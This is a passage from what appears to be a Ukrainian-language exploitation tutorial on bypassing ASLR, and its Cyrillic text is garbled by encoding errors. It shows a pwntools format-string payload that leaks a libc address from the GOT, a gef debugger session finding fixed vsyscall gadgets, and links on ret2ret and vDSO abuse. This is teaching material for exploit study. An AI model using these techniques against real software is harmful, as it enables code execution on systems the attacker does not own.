* **–§–æ—Ä–º–∞—Ç —Ä—è–¥–∫—ñ–≤ –¥–æ–≤—ñ–ª—å–Ω–æ–≥–æ —á–∏—Ç–∞–Ω–Ω—è**

–¢–æ—á–Ω–æ —Ç–∞–∫ —Å–∞–º–æ, —è–∫ —É –≤–∏–ø–∞–¥–∫—É –∑ ret2plt, —è–∫—â–æ —É –≤–∞—Å —î –¥–æ–≤—ñ–ª—å–Ω–µ —á–∏—Ç–∞–Ω–Ω—è —á–µ—Ä–µ–∑ –≤—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å —Ñ–æ—Ä–º–∞—Ç—É —Ä—è–¥–∫—ñ–≤, –º–æ–∂–ª–∏–≤–æ –≤–∏—Ç—ñ—Å–Ω–∏—Ç–∏ –∞–¥—Ä–µ—Å—É **—Ñ—É–Ω–∫—Ü—ñ—ó libc** –∑ GOT. –ù–∞—Å—Ç—É–ø–Ω–∏–π [**–ø—Ä–∏–∫–ª–∞–¥ –∑–≤—ñ–¥—Å–∏**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
–í–∏ –º–æ–∂–µ—Ç–µ –∑–Ω–∞–π—Ç–∏ –±—ñ–ª—å—à–µ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø—Ä–æ –¥–æ–≤—ñ–ª—å–Ω–µ —á–∏—Ç–∞–Ω–Ω—è —Ñ–æ—Ä–º–∞—Ç–Ω–∏—Ö —Ä—è–¥–∫—ñ–≤ –∑–∞ –ø–æ—Å–∏–ª–∞–Ω–Ω—è–º:

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

–°–ø—Ä–æ–±—É–π—Ç–µ –æ–±—ñ–π—Ç–∏ ASLR, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ –∞–¥—Ä–µ—Å–∞–º–∏ –≤—Å–µ—Ä–µ–¥–∏–Ω—ñ —Å—Ç–µ–∫—É:

{% content-ref url="ret2ret.md" %}
[ret2ret.md](ret2ret.md)
{% endcontent-ref %}

### vsyscall

–ú–µ—Ö–∞–Ω—ñ–∑–º **`vsyscall`** –ø—Ä–∏–∑–Ω–∞—á–µ–Ω–∏–π –¥–ª—è –ø—ñ–¥–≤–∏—â–µ–Ω–Ω—è –ø—Ä–æ–¥—É–∫—Ç–∏–≤–Ω–æ—Å—Ç—ñ, –¥–æ–∑–≤–æ–ª—è—é—á–∏ –≤–∏–∫–æ–Ω—É–≤–∞—Ç–∏ –ø–µ–≤–Ω—ñ —Å–∏—Å—Ç–µ–º–Ω—ñ –≤–∏–∫–ª–∏–∫–∏ –≤ –ø—Ä–æ—Å—Ç–æ—Ä—ñ –∫–æ—Ä–∏—Å—Ç—É–≤–∞—á–∞, —Ö–æ—á–∞ –≤–æ–Ω–∏ —Ñ—É–Ω–¥–∞–º–µ–Ω—Ç–∞–ª—å–Ω–æ –Ω–∞–ª–µ–∂–∞—Ç—å —è–¥—Ä—É. –ö—Ä–∏—Ç–∏—á–Ω–æ—é –ø–µ—Ä–µ–≤–∞–≥–æ—é **vsyscalls** —î —ó—Ö **—Ñ—ñ–∫—Å–æ–≤–∞–Ω—ñ –∞–¥—Ä–µ—Å–∏**, —è–∫—ñ –Ω–µ –ø—ñ–¥–¥–∞—é—Ç—å—Å—è **ASLR** (–≤–∏–ø–∞–¥–∫–æ–≤–µ —Ä–æ–∑—Ç–∞—à—É–≤–∞–Ω–Ω—è –ø—Ä–æ—Å—Ç–æ—Ä—É –∞–¥—Ä–µ—Å). –¶—è —Ñ—ñ–∫—Å–æ–≤–∞–Ω–∞ –ø—Ä–∏—Ä–æ–¥–∞ –æ–∑–Ω–∞—á–∞—î, —â–æ –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫–∏ –Ω–µ –ø–æ—Ç—Ä–µ–±—É—é—Ç—å —É—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ –Ω–∞ –≤–∏—Ç—ñ–∫ —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –¥–ª—è –≤–∏–∑–Ω–∞—á–µ–Ω–Ω—è —ó—Ö –∞–¥—Ä–µ—Å —Ç–∞ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞–Ω–Ω—è —ó—Ö —É –µ–∫—Å–ø–ª–æ–π—Ç—ñ.\
–û–¥–Ω–∞–∫ —Ç—É—Ç –Ω–µ –±—É–¥–µ –∑–Ω–∞–π–¥–µ–Ω–æ –¥—É–∂–µ —Ü—ñ–∫–∞–≤–∏—Ö –≥–∞–¥–∂–µ—Ç—ñ–≤ (—Ö–æ—á–∞, –Ω–∞–ø—Ä–∏–∫–ª–∞–¥, –º–æ–∂–ª–∏–≤–æ –æ—Ç—Ä–∏–º–∞—Ç–∏ –µ–∫–≤—ñ–≤–∞–ª–µ–Ω—Ç `ret;`)

(–ù–∞—Å—Ç—É–ø–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥ —Ç–∞ –∫–æ–¥ –≤–∑—è—Ç–æ –∑ [**—Ü—å–æ–≥–æ –æ–ø–∏—Å—É**](https://guyinatuxedo.github.io/15-partial\_overwrite/hacklu15\_stackstuff/index.html#exploitation))

–ù–∞–ø—Ä–∏–∫–ª–∞–¥, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –∞–¥—Ä–µ—Å—É `0xffffffffff600800` —É —Å–≤–æ—î–º—É –µ–∫—Å–ø–ª–æ–π—Ç—ñ. –•–æ—á–∞ —Å–ø—Ä–æ–±–∞ –±–µ–∑–ø–æ—Å–µ—Ä–µ–¥–Ω—å–æ –ø–µ—Ä–µ–π—Ç–∏ –¥–æ —ñ–Ω—Å—Ç—Ä—É–∫—Ü—ñ—ó `ret` –º–æ–∂–µ –ø—Ä–∏–∑–≤–µ—Å—Ç–∏ –¥–æ –Ω–µ—Å—Ç–∞–±—ñ–ª—å–Ω–æ—Å—Ç—ñ –∞–±–æ –∞–≤–∞—Ä—ñ–π–Ω–æ–≥–æ –∑–∞–≤–µ—Ä—à–µ–Ω–Ω—è –ø—ñ—Å–ª—è –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫—ñ–ª—å–∫–æ—Ö –≥–∞–¥–∂–µ—Ç—ñ–≤, –ø–µ—Ä–µ—Ö—ñ–¥ –Ω–∞ –ø–æ—á–∞—Ç–æ–∫ `syscall`, –Ω–∞–¥–∞–Ω–æ—ó —Ä–æ–∑–¥—ñ–ª–æ–º **vsyscall**, –º–æ–∂–µ –±—É—Ç–∏ —É—Å–ø—ñ—à–Ω–∏–º. –†–µ—Ç–µ–ª—å–Ω–æ —Ä–æ–∑–º—ñ—Å—Ç–∏–≤—à–∏ –≥–∞–¥–∂–µ—Ç **ROP**, —è–∫–∏–π –≤–µ–¥–µ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –¥–æ —Ü—ñ—î—ó –∞–¥—Ä–µ—Å–∏ **vsyscall**, –∑–ª–æ–≤–º–∏—Å–Ω–∏–∫ –º–æ–∂–µ –¥–æ—Å—è–≥—Ç–∏ –≤–∏–∫–æ–Ω–∞–Ω–Ω—è –∫–æ–¥—É, –Ω–µ –ø–æ—Ç—Ä–µ–±—É—é—á–∏ –æ–±—Ö–æ–¥—É **ASLR** –¥–ª—è —Ü—ñ—î—ó —á–∞—Å—Ç–∏–Ω–∏ –µ–∫—Å–ø–ª–æ–π—Ç—É.
```
ef‚û§  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555556000 0x0000000000000000 r-x /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555755000 0x0000555555756000 0x0000000000001000 rw- /Hackery/pod/modules/partial_overwrite/hacklu15_stackstuff/stackstuff
0x0000555555756000 0x0000555555777000 0x0000000000000000 rw- [heap]
0x00007ffff7dcc000 0x00007ffff7df1000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df1000 0x00007ffff7f64000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f64000 0x00007ffff7fad000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fad000 0x00007ffff7fb0000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb0000 0x00007ffff7fb3000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb3000 0x00007ffff7fb9000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef‚û§  x.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
A syntax error in expression, near `.g <pre> 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]'.
gef‚û§  x/8g 0xffffffffff600000
0xffffffffff600000:    0xf00000060c0c748    0xccccccccccccc305
0xffffffffff600010:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600020:    0xcccccccccccccccc    0xcccccccccccccccc
0xffffffffff600030:    0xcccccccccccccccc    0xcccccccccccccccc
gef‚û§  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
gef‚û§  x/4i 0xffffffffff600800
0xffffffffff600800:    mov    rax,0x135
0xffffffffff600807:    syscall
0xffffffffff600809:    ret
0xffffffffff60080a:    int3
```
### vDSO

–ó–≤–µ—Ä–Ω—ñ—Ç—å —É–≤–∞–≥—É, —è–∫–∏–º —á–∏–Ω–æ–º –º–æ–∂–ª–∏–≤–æ **–æ–±—ñ–π—Ç–∏ ASLR, –∑–ª–æ–≤–∂–∏–≤–∞—é—á–∏ vdso**, —è–∫—â–æ —è–¥—Ä–æ —Å–∫–æ–º–ø—ñ–ª—å–æ–≤–∞–Ω–µ –∑ CONFIG\_COMPAT\_VDSO, –æ—Å–∫—ñ–ª—å–∫–∏ –∞–¥—Ä–µ—Å–∞ vdso –Ω–µ –±—É–¥–µ –≤–∏–ø–∞–¥–∫–æ–≤–æ—é. –î–ª—è –æ—Ç—Ä–∏–º–∞–Ω–Ω—è –¥–æ–¥–∞—Ç–∫–æ–≤–æ—ó —ñ–Ω—Ñ–æ—Ä–º–∞—Ü—ñ—ó –ø–µ—Ä–µ–≥–ª—è–Ω—å—Ç–µ:

{% content-ref url="../../rop-return-oriented-programing/ret2vdso.md" %}
[ret2vdso.md](../../rop-return-oriented-programing/ret2vdso.md)
{% endcontent-ref %}
